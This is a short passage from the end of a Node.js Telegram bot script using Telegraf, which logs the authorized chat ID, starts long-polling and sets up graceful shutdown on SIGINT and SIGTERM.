    console.log(`[bot] Authorized chat: ${ALLOWED_CHAT_ID}`);
  });

  // Start Telegraf long-polling
  await bot.launch();
  console.log('[bot] Telegraf polling started.');

  // Graceful shutdown
  process.once('SIGINT',  () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
})();
